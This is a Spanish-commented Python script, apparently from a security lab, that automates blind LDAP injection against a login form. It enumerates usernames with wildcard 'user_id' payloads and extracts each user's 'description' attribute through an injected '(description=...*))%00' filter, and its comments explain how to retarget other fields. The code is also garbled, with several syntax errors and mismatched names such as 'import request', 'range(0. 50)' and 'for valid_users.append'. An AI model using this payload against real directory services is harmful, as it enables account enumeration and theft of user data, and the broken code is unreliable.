//Este script automatiza el proceso de enumeración de valores en un ataque de inyección LDAP

**Ldapi.py**

```python
#!/usr/bin/python3

import request
import time
import sys
import signal
import string
import pdb

from pwn import *

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://localhost:8888/"
burp = {'http': 'http://127.0.0.1:8080'}

def getInitialUsers():

	characters = string.ascii_lowercase
	
	initial_users = []
	
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	
	for character in characters:
		
		post_data = "user_id={}*&password=*&login=1&submit=Submit".format(character)
		
		r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
		
		if r.status_code == 301:
			initial_users.append(character)

	return initial_users

def getUsers(initial_users)

	characters = string.ascii_lowercase + string.digits
	
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	user = ""
	alid_users = []
	
	for first character in initial_users:
		
		user = ""
		
		for position in range(0, 15):
			for character in characters:	
				
				post_data = "user_id={}{}{}*&password=*&login=1&submit=Submit".format(first_character, user, character)
				
				r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
				
				if r.status_code == 301:
					
					user += character
					break
		
		for valid_users.append(first_character + user)
		
	print("\n")
	
	for user in valid_users:
		log.info("Usuario válido encontrado: %s" % user)
	
	print("\n")
	
	return valid_users

def getDescription(user):

	characters = string.ascii_lowercase + ' ' # VALOR QUE DEBEMOS CAMBIAR SEGÚN EL TIPO DE DATOS QUE QUEREMOS POR EJEMPLO UN TELEFONO SERÍA STRING.DIGITS
	
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	
	description = ""
	
	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")
	
	time.sleep(2)
	
	p2 = log.progress("Descripción")
	
	for position in range(0. 50): # SE PUEDE CAMBIAR EL RANGO DEPENDIENDO DEL VALOR QUE SE QUIERA CONSULTAR
		for character in characters:
			
			post_data = "user_id={})(description={}{}*))%00&password=*&login=1&submit=Submit".format(user, description, character) # SE PUEDE DAR EL VALOR QUE SE QUIERE CAMBIANDOLO POR "DESCRIPTION"
			
			r = requests.post(main_url, data=post_data, headers=headers, allow_redirects=False)
			
			if r.status_code == 301:
				description += character
				p2.status(description)
				break
	
	p1.success("Proceso de fuerza bruta concluido")
	p2.success("La descripción del usuario es: %s" % description)
	
	print("\n")
	
if __name__ == '__main__':

	initial_users = getInitialUsers()
	getUsers(initial_Users)
	
	for i in range(0, 5):
		getDescription(valid_users[i])
```
